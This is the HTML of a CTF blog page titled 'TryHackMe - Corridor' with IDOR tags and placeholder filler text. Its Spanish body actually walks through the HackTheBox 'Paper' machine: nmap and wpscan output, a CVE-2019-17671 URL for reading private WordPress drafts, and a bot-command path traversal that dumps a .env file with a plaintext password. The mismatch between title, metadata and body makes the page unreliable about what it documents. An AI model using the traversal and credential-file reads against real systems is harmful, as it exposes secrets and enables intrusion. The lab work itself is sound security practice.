      var htmlElem = document.querySelector('html');

      if (mobileSearchClassElem) {
        mobileSearchClassElem.style.display = 'none';
      }

      mobileSearchBtnElem ?
        mobileSearchBtnElem.addEventListener('click', function () {
          if (mobileSearchContainer) {
            mobileSearchContainer.style.display = 'block';
          }

          if (mobileSearchInputElem) {
            mobileSearchInputElem.focus();
          }

          if (htmlElem) {
            htmlElem.style.overflowY = 'hidden';
          }
        }) : null;

      mobileSearchCloseBtnElem ?
        mobileSearchCloseBtnElem.addEventListener('click', function () {
          if (mobileSearchContainer) {
            mobileSearchContainer.style.display = 'none';
          }

          if (mobileSearchInputElem) {
            mobileSearchInputElem.value = '';
          }

          if (mobileSearchResultsElem) {
            while (mobileSearchResultsElem.firstChild) {
              mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
            }
          }

          if (htmlElem) {
            htmlElem.style.overflowY = 'visible';
          }
        }) : null;

      mobileSearchInputElem ?
        mobileSearchInputElem.addEventListener('keydown', function (e) {
          var keyCode = e.which || e.keyCode;
          if (e.key === 'Escape' || keyCode === 27) {
            if (mobileSearchContainer) {
              mobileSearchContainer.style.display = 'none';
            }

            if (mobileSearchInputElem) {
              mobileSearchInputElem.value = '';
            }

            if (mobileSearchResultsElem) {
              while (mobileSearchResultsElem.firstChild) {
                mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
              }
            }
            if (htmlElem) {
              htmlElem.style.overflowY = 'visible';
            }
          }
        }) : null;

      function renderSearchResultsMain(searchText, results) {
        var searchBody = document.querySelector('.search-result__body');
        var originUl = searchBody.querySelector('ul');
        var ul = document.createElement('ul');

        if (!searchText) {
          searchResult ? searchResult.setAttribute('data-display', 'none') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        } else if (results) {
          if (results && results.length) {
            results.forEach(function (result) {
              makeLi(ul, result);
            });

            searchResult ? searchResult.setAttribute('data-display', 'block') : null;
            summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
          }
        }

        originUl.parentNode.replaceChild(ul, originUl);
      }

      function renderSearchHighlightResultsMain(searchText, results) {
        var searchBody = document.querySelector('.search-result__body');
        var originUl = searchBody.querySelector('ul');
        var ul = document.createElement('ul');

        if (!searchText) {
          searchResult ? searchResult.setAttribute('data-display', 'none') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        } else if (results) {
          if (results && results.length) {
            results.forEach(function (result) {
              makeHighlightLi(ul, result);
            });

            searchResult ? searchResult.setAttribute('data-display', 'block') : null;
            summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
          }
        }

        originUl.parentNode.replaceChild(ul, originUl);
      }

    });
  </script>

  <link rel="stylesheet" href="../../css/main.min.css">
  <link rel="stylesheet" href="../../css/custom.min.css">
  <link rel="canonical" href="index.html">
  <link rel="shortcut icon" href="../../images/itachi-alt.ico" type="image/x-icon">
  <link rel="icon" href="../../favicon.html" sizes="any" type="image/png"/>
</head>

<body id="root" class="theme__dark">

  <script>
    var localTheme = localStorage.getItem('theme');
    if (localTheme) {
      document.getElementById('root').className = 'theme__' + localTheme;
    }
  </script>

  <div id="container">
    <div class="wrapper" data-type="posts" data-kind="page">
      <nav class="navbar" role="navigation" aria-label="main navigation" data-dir="ltr">
        <div class="navbar__brand">

          &nbsp;&nbsp;

          <a href="https://trello.com/b/FJSdpFbs/sem7" title="Home" class="navbar__title-link">
            <h6 class="navbar__title">&gt; IanLevy<span class="logo__cursor"></span></h6>
          </a>
        </div>

        <div id="mobileSearchBtn" class="mobile-search__btn" data-ani="true">
          <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24">
            <path fill="none" d="M0 0h24v24H0V0z" />
            <path
              d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
          </svg>
        </div>

        <div id="search-mobile-container" class="mobile-search hide" data-dir="ltr">
          <div class="mobile-search__top">
            <input id="search-mobile" type="text" aria-label="Mobile Search" placeholder="Buscar"
              class="mobile-search__top--input" />
            <div id="search-mobile-close" class="mobile-search__top--icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24">
                <path opacity=".87" fill="none" d="M0 0h24v24H0V0z" />
                <path fill="currentColor"
                  d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z" />
              </svg>
            </div>
          </div>
          <div id="search-mobile-results" class="mobile-search__body">

          </div>
        </div>

        <a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false" data-ani="true">
          <span aria-hidden="true"></span>
          <span aria-hidden="true"></span>
          <span aria-hidden="true"></span>
        </a>
        <div class="navbarm__collapse" data-open="false">
          <ul dir="ltr">
            <li class="navbarm__menu--item ">
              <a href="https://github.com/PainTensei">
                CTF
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24">
                  <path fill="currentColor"
                    d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z" />
                </svg>
              </a>
            </li>

            <li class="navbarm__menu--item navbarm__menu--subitem">
              <a href="https://tryhackme.com/p/PainTensei">TryHackMe</a>
            </li>

            <li class="navbarm__menu--item navbarm__menu--subitem">
              <a href="https://github.com/PainTensei">HackTheBox</a>
            </li>

            <li class="navbarm__menu--item ">
              <a href="https://github.com/PainTensei">Writeups</a>
            </li>

            <li class="navbarm__menu--item ">
              <a href="https://www.linkedin.com/in/ian-levy-schlupp">About_Me</a>
            </li>
          </ul>
        </div>

        <div class="navbar__menu">
          <a href="https://github.com/PainTensei" class="navbar__menu-item navbar__slide-down " dir="ltr"
            data-ani="true">Writeups</a>

          <a href="https://www.linkedin.com/in/ian-levy-schlupp" class="navbar__menu-item navbar__slide-down " dir="ltr"
            data-ani="true">About_Me</a>

<!-- <div class="navbar__dropdown navbar__slide-down" data-ani="true">
<a href="https://github.com/PainTensei" class="navbar__menu-item " dir="ltr">
  CTF
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24">
<path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z" />
</svg></a>
<div class="navbar__dropdown--content">

<a href="https://tryhackme.com/p/PainTensei" class="navbar__dropdown--item"
dir="ltr">TryHackMe</a>
<a href="https://github.com/PainTensei" class="navbar__dropdown--item"
dir="ltr">HackTheBox</a>
</div></div> -->

        </div>
      </nav>

      <main class="single__main main">
        <div class="single ">
          <div class="single__nojs">This page looks best with JavaScript enabled</div>

          <script>
            document.querySelector('.single').classList.remove('hide');
            document.querySelector('.single__nojs').classList.add('hide');
          </script>

          <h2 class="single__title" data-ani="true" id="title__single">TryHackMe - Corridor</h2>
          <div class="single__meta">
            <div class="single__infos">
              <time class="single__info" title="Written At">Oct 7, 2022 </time>
              &nbsp;•&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;Ian Levy</span>
              <span class="single__info">
              </span>
            </div>

            <ul class="single__tags caption">🏷️
              <li><a href="https://portswigger.net/web-security/access-control/idor" class="single__tag" title="IDOR">IDOR</a></li>
              <li><a href="https://portswigger.net/web-security/access-control" class="single__tag" title="Access control">Access control</a></li>
              <li><a href="https://securityboulevard.com/2022/06/what-is-url-manipulation-or-url-rewriting/" class="single__tag" title="URL Manipulation">URL Manipulation</a></li>
            </ul>

          </div>
          <article class="single__contents" data-dir="ltr" data-ani="true">

            <div class="featured-image__wrapper">
              <img src="../../images/corridor.png" alt="featured image" class="featured-image" style="border: dotted 2px darkblue">
            </div>

            <p>In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.In this writeup we hack.</p>

            <table>
              <thead style="background:black;">
                <th>Name</th>
                <th align="center"><a href="https://tryhackme.com/room/corridor">Corridor</a>
              </thead>
              <tbody>
                <tr>
                  <td><strong>OS</strong></td>
                  <td align="center">Linux</td>
                </tr>
                <tr>
                  <td><strong>Points</strong></td>
                  <td align="center">30</td>
                </tr>
                <tr>
                  <td><strong>Difficulty</strong></td>
                  <td align="center">Easy</td>
                </tr>
                <tr>
                  <td><strong>IP</strong></td>
                  <td align="center">10.10.83.99</td>
                </tr>
                <tr>
                  <td><strong>Creator</strong></td>
                  <td align="center"><span>
                    <p style="margin: 0; margin-top: 2%;">
                      <a href="https://tryhackme.com/p/JohnHammond">
                      <img src="https://tryhackme-images.s3.amazonaws.com/user-avatars/885c19583ddcd55ab7b93c5c349d284c.png" 
                      style="width: 7%;"/>
                      John Hammond
                      </a>
                    </p>
                    </span></td>
                </tr>
                <tr>
                  <td>
                    <a href="#single__title" class="button" style="width: 72px; height: 30px; pointer-events: none;"
                      data-color="default" target="_blank" rel="noreferrer">
                      <span class="button__text">
                        Matrix
                      </span>
                    </a></td>
                  <td align="center">
                    <div class="box">
                      <img
                        src="https://cdn.discordapp.com/attachments/836228782066237442/1023872754522521630/unknown.png">
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>

            &nbsp;
            <hr class="HRcool">

            <h1 id="Recon">Recon</h1>
            <h2 id="Nmap">nmap</h2>
            <p><code>nmap</code> shows us open ports: http/s (80, 443) and ssh (22).</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
<pre class="chroma">
<!-- Amount of lines required go down here -->
<code>
<span class="lnt"> 1</span>
<span class="lnt"> 2</span>
<span class="lnt"> 3</span>
<span class="lnt"> 4</span>
<span class="lnt"> 5</span>
<span class="lnt"> 6</span>
<span class="lnt"> 7</span>
<span class="lnt"> 8</span>
<span class="lnt"> 9</span>
<span class="lnt">10</span>
<span class="lnt">11</span>
<span class="lnt">12</span>
<span class="lnt">13</span>
<span class="lnt">14</span>
<span class="lnt">15</span>
<span class="lnt">16</span>
<span class="lnt">17</span>
<span class="lnt">18</span>
<span class="lnt">19</span>
<span class="lnt">20</span>
<span class="lnt">21</span>
<span class="lnt">22</span>
<span class="lnt">23</span>
<span class="lnt">24</span>
<span class="lnt">25</span>
<span class="lnt">26</span>
<span class="lnt">27</span>
<span class="lnt">28</span>
<span class="lnt">29</span>
<span class="lnt">30</span>
<span class="lnt">31</span>
</code></pre>
</td>

<td class="lntd">
  <pre class="chroma">
    <code class="language-bash" data-lang="bash">
      <span class="c1"># Nmap 7.91 scan initiated Sat Feb  5 23:19:51 2022 as: nmap -p22,80,443 -sC -sV -oN nmap_scan 10.129.104.126</span>
Nmap scan report <span class="k">for</span> 10.129.104.126 <span class="o">(</span>10.129.104.126<span class="o">)</span>
Host is up <span class="o">(</span>0.088s latency<span class="o">)</span>.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span class="o">)</span>
<span class="p">|</span>_http-generator: HTML Tidy <span class="k">for</span> HTML5 <span class="k">for</span> Linux version 5.7.28
<span class="p">|</span> http-methods:
<span class="p">|</span>_  Potentially risky methods: TRACE
<span class="p">|</span>_http-server-header: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
<span class="p">|</span>_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span class="o">)</span>
<span class="p">|</span>_http-generator: HTML Tidy <span class="k">for</span> HTML5 <span class="k">for</span> Linux version 5.7.28
<span class="p">|</span> http-methods:
<span class="p">|</span>_  Potentially risky methods: TRACE
<span class="p">|</span>_http-server-header: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
<span class="p">|</span>_http-title: HTTP Server Test Page powered by CentOS
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>Unspecified/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: DNS:localhost.localdomain
<span class="p">|</span> Not valid before: 2021-07-03T08:52:34
<span class="p">|</span>_Not valid after:  2022-07-08T10:32:34
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
<span class="p">|</span> tls-alpn:
<span class="p">|</span>_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Sat Feb  5 23:20:09 2022 -- 1 IP address (1 host up) scanned in 18.70 seconds</span>
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <h2 id="web-site">Web Site</h2>
            <p>Realizamos una solicitud al sitio web con curl y vemos el header <a
                href="https://webtechsurvey.com/response-header/x-backend-server"><code>X-Backend-Server</code></a> el
              dominio <code>office.paper</code> el cual agregamos al archivo <code>/etc/hosts</code>.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/paper ❯ curl -sI http://10.129.104.126/
HTTP/1.1 <span class="m">403</span> Forbidden
Date: Sat, <span class="m">05</span> Feb <span class="m">2022</span> 23:52:20 GMT
Server: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 23:47:13 GMT
ETag: <span class="s2">&#34;30c0b-5c5c7fdeec240&#34;</span>
Accept-Ranges: bytes
Content-Length: <span class="m">199691</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

 π ~/htb/paper ❯
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <p>Tras visitar el sitio web vemos multiples posts, además observamos en el footer que es un
              WordPress.<br />
              <img src="../../images/posts/htb/paper/Screenshot_website_wp.jpg" alt="image" /></p>
            <h2 id="wpscan">Wpscan</h2>
            <p>Ejecutamos <code>wpscan</code> para enumerar toda la información posible, se muestra la versión de
              WordPress como Insegura y encontramos tres usuarios.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/paper ❯ wpscan --url http://office.paper/ -e ap,vt,cb,dbe,u,
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \
</span><span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |
</span><span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span><span class="s1">
</span><span class="s1">         WordPress Security Scanner by the WPScan Team
</span><span class="s1">                         Version 3.8.18
</span><span class="s1">       Sponsored by Automattic - https://automattic.com/
</span><span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span><span class="s1">_______________________________________________________________
</span><span class="s1">
</span><span class="s1">[+] URL: http://office.paper/ [10.129.104.126]
</span><span class="s1">[+] Started: Sat Feb  5 23:54:13 2022
</span><span class="s1">
</span><span class="s1">Interesting Finding(s):
</span><span class="s1">
</span><span class="s1">[+] Headers
</span><span class="s1"> | Interesting Entries:
</span><span class="s1"> |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
</span><span class="s1"> |  - X-Powered-By: PHP/7.2.24
</span><span class="s1"> |  - X-Backend-Server: office.paper
</span><span class="s1"> | Found By: Headers (Passive Detection)
</span><span class="s1"> | Confidence: 100%
</span><span class="s1">
</span><span class="s1">[+] WordPress readme found: http://office.paper/readme.html
</span><span class="s1"> | Found By: Direct Access (Aggressive Detection)
</span><span class="s1"> | Confidence: 100%
</span><span class="s1">
</span><span class="s1">[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
</span><span class="s1"> | Found By: Rss Generator (Passive Detection)
</span><span class="s1"> |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
</span><span class="s1"> |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
</span><span class="s1">
</span><span class="s1">[+] WordPress theme in use: construction-techup
</span><span class="s1"> | Location: http://office.paper/wp-content/themes/construction-techup/
</span><span class="s1"> | Last Updated: 2021-07-17T00:00:00.000Z
</span><span class="s1"> | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
</span><span class="s1"> | [!] The version is out of date, the latest version is 1.4
</span><span class="s1"> | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
</span><span class="s1"> | Style Name: Construction Techup
</span><span class="s1"> | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
</span><span class="s1"> | Author: wptexture
</span><span class="s1"> | Author URI: https://testerwp.com/
</span><span class="s1"> |
</span><span class="s1"> | Found By: Css Style In Homepage (Passive Detection)
</span><span class="s1"> |
</span><span class="s1"> | Version: 1.1 (80% confidence)
</span><span class="s1"> | Found By: Style (Passive Detection)
</span><span class="s1"> |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;</span>Version: 1.1<span class="err">&#39;</span>

<span class="o">[</span>+<span class="o">]</span> Enumerating All Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>

<span class="o">[</span>i<span class="o">]</span> No plugins Found.

<span class="o">[</span>.. snip ..<span class="o">]</span>

<span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+<span class="o">]</span> prisonmike
 <span class="p">|</span> Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
 <span class="p">|</span> Confirmed By:
 <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
 <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+<span class="o">]</span> nick
 <span class="p">|</span> Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
 <span class="p">|</span> Confirmed By:
 <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+<span class="o">]</span> creedthoughts
 <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>.. snip ..<span class="o">]</span>
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <h2 id="wordpress">WordPress</h2>
            <p>Revisamos la version y vulnerabilidades a la version <strong>5.2.3</strong> en la <a
                href="https://wpscan.com/wordpress/523">pagina de WordPress</a>, entre ellas destacamos el <a
                href="https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2">CVE-2019-17671</a> donde
              observamos que es posible ver post privados o borradores, se muestra el PoC.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt">1
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash">http://wordpress.local/?static<span class="o">=</span>1<span class="p">&amp;</span><span class="nv">order</span><span class="o">=</span>asc 
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <p>Tras emplear el PoC en el sitio, vemos &ldquo;multiples posts&rdquo;, se menciona un sistema de chat y
              vemos una url con un nuevo subdominio el cual agregamos a <code>/etc/hots</code>.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_185343.png" alt="image" /></p>
            <h1 id="user---dwight">User - Dwight</h1>
            <h2 id="rocketchat">Rocket.chat</h2>
            <p>La url de registro nos lleva a sistema de chat <code>rocket.chat</code>.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_185705.png" alt="image" /></p>
            <p>Tras ingresar vemos el único canal, <strong>#general</strong>, aunque es de &lsquo;sólo
              lectura&rsquo;.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190000.png" alt="image" /></p>
            <p>Vemos muchos mensajes entre ellos se menciona un bot y se listan los diferentes comandos aceptados.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190040.png" alt="image" /></p>
            <p>&lsquo;kelly&rsquo; menciona que el bot funciona por Mensajes Directos, por lo que iniciamos una
              conversación con el bot.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190214.png" alt="image" /></p>
            <h2 id="hubot">Hubot</h2>
            <p>Enviamos el comando <code>help</code> y nuevamente vemos los diferentes comandos, pero vemos 2
              interesantes, <code>file</code> y <code>list</code>.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash">For security reasons, the access is limited to the Sales folder.
3. Files:
eg: <span class="s1">&#39;recyclops get me the file test.txt&#39;</span>, or <span class="s1">&#39;recyclops could you send me the file sale/secret.xls&#39;</span> or just <span class="s1">&#39;recyclops file test.txt&#39;</span>

4. List:
You can ask me to list the files

eg: <span class="s1">&#39;recyclops i need directory list sale&#39;</span> or just <span class="s1">&#39;recyclops list sale&#39;</span>

</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <p><code>file</code> realiza <code>cat</code> al archivo dado, en el directorio
              <code>/home/dwight/sales/test.txt</code> y <code>list</code> muestra los directorios/archivos en
              <code>sales/</code>.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190630.png" alt="image" /></p>
            <p>Intentamos realizar &lsquo;Command Injection&rsquo; pero parece tener algun tipo de filtro.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190732.png" alt="image" /></p>
            <p>Realizamos una enumeración de archivos dentro del directorio utilizando <code>../</code> vemos multiples
              directorios/archivos en <code>home/dwight</code>.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190846.png" alt="image" /></p>
            <p>En la carpeta <code>hubot/</code> vemos archivos de configuración y codigo fuente del bot.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_190921.png" alt="image" /></p>
            <p>El archivo <code>.env</code> contiene la configuración del bot, y vemos credenciales.<br />
              <img src="../../images/posts/htb/paper/Screenshot_20220205_191019.png" alt="image" /></p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash">file ../hubot/.env 
&lt;!<span class="o">=====</span>Contents of file ../hubot/.env<span class="o">=====</span>&gt;
<span class="nb">export</span> <span class="nv">ROCKETCHAT_URL</span><span class="o">=</span><span class="s1">&#39;http://127.0.0.1:48320&#39;</span>
<span class="nb">export</span> <span class="nv">ROCKETCHAT_USER</span><span class="o">=</span>recyclops
<span class="nb">export</span> <span class="nv">ROCKETCHAT_PASSWORD</span><span class="o">=</span>Queenofblad3s!23
<span class="nb">export</span> <span class="nv">ROCKETCHAT_USESSL</span><span class="o">=</span><span class="nb">false</span>
<span class="nb">export</span> <span class="nv">RESPOND_TO_DM</span><span class="o">=</span><span class="nb">true</span>
<span class="nb">export</span> <span class="nv">RESPOND_TO_EDITED</span><span class="o">=</span><span class="nb">true</span>
<span class="nb">export</span> <span class="nv">PORT</span><span class="o">=</span><span class="m">8000</span>
<span class="nb">export</span> <span class="nv">BIND_ADDRESS</span><span class="o">=</span>127.0.0.1
&lt;!<span class="o">=====</span>End of file ../hubot/.env<span class="o">=====</span>&gt;
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
